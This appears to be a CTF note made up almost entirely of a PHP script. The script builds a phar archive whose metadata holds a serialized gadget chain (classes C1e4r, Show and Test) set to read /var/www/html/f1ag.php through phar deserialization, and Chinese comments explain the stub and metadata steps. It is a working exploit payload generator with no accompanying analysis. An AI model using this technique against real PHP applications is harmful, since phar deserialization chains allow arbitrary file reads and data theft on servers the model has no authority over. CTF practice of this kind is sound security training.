![[Pasted image 20231208155500.png]]

```php
<?php class C1e4r { public $test; public $str; } class Show { public $source; public $str; } class Test { public $file; public $params; } $show = new Show(); $test =new test(); $test->params = array('source'=>'/var/www/html/f1ag.php'); $show->str = array('str'=>$test); $c1e4r = new C1e4r(); $c1e4r->str = $show; $phar = new Phar("ddd.phar"); //后缀名必须为phar $phar->startBuffering(); $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub $phar->setMetadata($c1e4r); //将自定义的meta-data存入manifest $phar->addFromString("test.txt", "test"); //添加要压缩的文件 //签名自动计算 $phar->stopBuffering(); ?>
```